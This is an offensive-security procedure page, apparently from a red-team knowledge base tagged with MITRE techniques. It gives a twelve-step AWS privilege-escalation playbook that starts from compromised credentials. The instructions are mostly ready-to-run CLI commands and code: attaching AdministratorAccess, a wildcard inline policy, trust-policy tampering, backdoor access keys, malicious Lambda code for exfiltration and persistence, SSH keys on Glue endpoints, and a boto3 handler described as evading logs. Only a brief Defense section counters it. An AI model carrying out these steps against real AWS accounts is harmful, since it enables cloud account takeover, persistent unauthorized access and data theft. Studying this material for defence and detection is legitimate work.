---
id: 8bab4397-0cbf-44db-a6b6-fae25805841b
name: AWS-Shadow-Admin-Access
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:09.346557+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access Token Manipulation|T1134 - Access Token Manipulation]]'
  - '[[techniques/Create Account|T1136 - Create Account]]'
sub_techniques: []
tags:
  - '[[tags/Admin equivalent permission]]'
  - '[[tags/AWS - Shadow Admin]]'
  - '[[tags/Cloud - AWS]]'
  - iam
  - privilege-escalation
commands:
  - '[[commands/aws-iam-add-user-to-group]]'
  - '[[commands/aws-ec2-associate-iam-instance-profile]]'
  - '[[commands/aws-iam-attach-admin-policy-to-role]]'
  - '[[commands/aws-iam-attach-admin-policy-to-user]]'
  - '[[commands/boto3-iam-attach-user-policy-lambda]]'
  - '[[commands/aws-iam-create-access-key]]'
  - '[[commands/aws-iam-put-user-policy]]'
  - '[[commands/aws-lambda-create-function]]'
  - '[[commands/aws-iam-create-policy-version-and-set-default]]'
  - '[[commands/aws-lambda-invoke-function]]'
  - '[[commands/aws-iam-update-assume-role-policy]]'
  - '[[commands/aws-glue-upload-ssh-public-key]]'
  - '[[commands/aws-lambda-update-function-code-zip]]'
  - '[[commands/aws-iam-wildcard-policy-snippet]]'
platforms:
  - AWS
tools: []
validated: true
---

# AWS-Shadow-Admin-Access

## Summary

This procedure demonstrates multiple techniques for achieving shadow administrative access in AWS IAM, allowing an attacker with initial compromised credentials to escalate privileges to full administrator level. Methods include attaching managed policies, creating inline policies with wildcard permissions, updating role assume policies, creating backdoor access keys, and deploying persistent Lambda functions or SSH access via Glue endpoints.

## Description

In an AWS environment, shadow admin access involves subtly granting excessive permissions to existing or new IAM entities without directly assigning the AdministratorAccess policy, evading detection through inline policies or role modifications. This is particularly effective in misconfigured environments where users have partial IAM write access. The procedure covers attaching AWS-managed admin policies to users or roles, injecting wildcard permissions via inline policies, modifying assume role documents to enable assumption from low-priv accounts, generating long-term access keys, and establishing persistence via Lambda or Glue. Success grants the attacker unrestricted access to AWS resources, enabling data exfiltration, resource modification, or further lateral movement. Target environments include AWS accounts with IAM write permissions but lacking strict policy reviews.

## Requirements

1. Compromised AWS credentials with at least partial IAM write access (e.g., iam:AttachUserPolicy, iam:PutUserPolicy).
2. AWS CLI installed and configured with the compromised credentials (aws configure).
3. Access to a policy document file (JSON) for inline policies.
4. For Lambda/Glue methods: Permissions for lambda:CreateFunction, glue:UpdateEndpoint.

## Defense

- Implement least privilege: Regularly audit IAM policies and remove excessive permissions using AWS IAM Access Analyzer.
- Enable CloudTrail logging for all regions and monitor for AttachUserPolicy, PutUserPolicy, UpdateAssumeRolePolicy via CloudWatch or SIEM.
- Use IAM policy boundaries to limit maximum permissions attachable to roles/users.
- Rotate access keys periodically and alert on creation of new keys or policy attachments.

## Objectives

1. Escalate privileges to AdministratorAccess equivalent without direct policy assignment.
2. Establish persistence through backdoor credentials or functions.
3. Enable unrestricted access for data exfiltration or resource control.

## Instructions

### Step 1: Attach Managed Admin Policy to IAM User

**Context**: If the compromised user has iam:AttachUserPolicy permission, attach the AWS-managed AdministratorAccess policy to grant full admin rights. This is a direct escalation path.

**Command** ([[commands/aws-iam-attach-admin-policy-to-user]]):
```bash
aws iam attach-user-policy --user-name my_username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

> This command binds the full admin policy to the specified user. Verify with `aws iam list-attached-user-policies --user-name my_username` to confirm attachment.

### Step 2: Attach Managed Admin Policy to IAM Role

**Context**: For role-based escalation, attach the admin policy to a role the attacker can assume, allowing temporary full privileges.

**Command** ([[commands/aws-iam-attach-admin-policy-to-role]]):
```bash
aws iam attach-role-policy --role-name role_i_can_assume --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

> After attachment, assume the role using `aws sts assume-role` with the updated trust policy. Expected confirmation: No errors, policy listed in role details.

### Step 3: Create Inline Admin Policy with Wildcard Permissions

**Context**: Use an inline policy to grant '*' actions on '*' resources, bypassing managed policy restrictions. First, prepare a JSON policy file using the wildcard snippet.

**Code** ([[codes/aws-iam-admin-policy-json-snippet]]):
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

**Command** ([[commands/aws-iam-put-user-policy]]):
```bash
aws iam put-user-policy --user-name my_username --policy-name my_inline_policy --policy-document file://path/to/administrator/policy.json
```

> The inline policy is attached directly to the user. This evades some monitoring as it's not a managed policy. Verify with `aws iam get-user-policy --user-name my_username --policy-name my_inline_policy`.

### Step 4: Update Role Assume Policy for Escalation

**Context**: Modify the trust policy of a privileged role to allow assumption from the compromised low-priv account, then attach admin policy if needed.

**Command** ([[commands/aws-iam-update-assume-role-policy]]):
```bash
aws iam update-assume-role-policy --role-name role_i_can_assume --policy-document file://path/to/assume/role/policy.json
```

> The policy document should include the compromised user's ARN in the Principal. After update, assume with `aws sts assume-role --role-arn arn:aws:iam::account:role/role_i_can_assume --role-session-name session`. Success: Temporary credentials returned.

### Step 5: Create Long-Term Access Key for Persistence

**Context**: Generate a new access key pair for the escalated user to maintain access post-compromise.

**Command** ([[commands/aws-iam-create-access-key]]):
```bash
aws iam create-access-key --user-name target_user
```

> Returns AccessKeyId and SecretAccessKey. Store securely for future use. Revocation alerts should trigger here.

### Step 6: Add User to Admin Group

**Context**: If an admin group exists, add the compromised user to inherit group policies.

**Command** ([[commands/aws-iam-add-user-to-group]]):
```bash
aws iam add-user-to-group --group-name target_group --user-name my_username
```

> User now inherits group permissions. List groups with `aws iam list-groups-for-user --user-name my_username` to verify.

### Step 7: Associate IAM Profile to EC2 for Instance Escalation

**Context**: Attach an admin role to a compromised EC2 instance for metadata service access to credentials.

**Command** ([[commands/aws-ec2-associate-iam-instance-profile]]):
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789abcdef0
```

> Instance assumes the role on next metadata query. Test with `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` from instance.

### Step 8: Create and Invoke Malicious Lambda for Persistence

**Context**: Deploy a Lambda function with admin permissions to execute backdoor code periodically.

**Command** ([[commands/aws-lambda-create-function]]):
```bash
aws lambda create-function --function-name my_function --runtime python3.6 --role arn:aws:iam::account:role/lambda_role --handler lambda_function.lambda_handler --code file://my/python/code.py
```

**Command** ([[commands/aws-lambda-invoke-function]]):
```bash
aws lambda invoke --function-name my_function output.txt
```

> Function executes arbitrary code. Use for exfil or persistence. Monitor Lambda invocations in CloudTrail.

### Step 9: Update Lambda Code with Zip for Backdoor

**Context**: If Lambda exists, update with malicious zip payload.

**Command** ([[commands/aws-lambda-update-function-code-zip]]):
```bash
aws lambda update-function-code --function-name target_function --zip-file fileb://my/lambda/code/zipped.zip
```

> Replaces function code. Invoke to test.

### Step 10: Upload SSH Key to Glue Endpoint for Access

**Context**: Enable SSH to a Glue dev endpoint for direct server access.

**Command** ([[commands/aws-glue-upload-ssh-public-key]]):
```bash
aws glue update-dev-endpoint --endpoint-name target_endpoint --public-key file://path/to/my/public/ssh/key.pub
```

> Allows SSH login to endpoint. Connect with `ssh -i private_key user@endpoint`.

### Step 11: Create New Policy Version with Admin and Set Default

**Context**: Escalate an existing policy by creating a new version with wildcards and setting as default.

**Command** ([[commands/aws-iam-create-policy-version-and-set-default]]):
```bash
aws iam create-policy-version --policy-arn target_policy_arn --policy-document file://path/to/administrator/policy.json --set-as-default
```

> Updates policy for attached entities. Verify version with `aws iam get-policy-version`.

### Step 12: Attach Policy via Boto3 in Lambda

**Context**: Use Python SDK in a Lambda to dynamically attach policies, evading CLI logs.

**Command** ([[commands/boto3-iam-attach-user-policy-lambda]]):
```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

> Deploy as Lambda handler. Invoke to execute attachment.
